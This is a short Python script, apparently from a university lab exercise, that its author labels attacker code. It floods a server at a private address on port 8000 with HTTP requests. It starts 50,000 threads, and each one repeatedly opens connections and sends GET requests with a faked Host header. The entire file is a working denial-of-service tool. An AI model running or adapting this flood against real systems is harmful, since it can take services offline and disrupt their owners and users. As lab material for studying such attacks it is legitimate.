'''
    author: jinal (kapatelj@uwindsor.ca)
'''
# attacker code to bombard server with enormous requests
import threading
import socket

target_ip = '10.9.0.5'
port = 8000
fake_ip = '10.9.0.6'

already_connected = 0

def dos_attack():
    while(True):
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((target_ip,port))
            s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'),(target_ip,port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'),(target_ip,port))
            s.close()
            
            global already_connected
            already_connected += 1
            if(already_connected % 500 == 0):
                print(already_connected)
        except:
            print("error")
            pass
        
for i in range(50000):
    thread = threading.Thread(target=dos_attack)
    thread.start()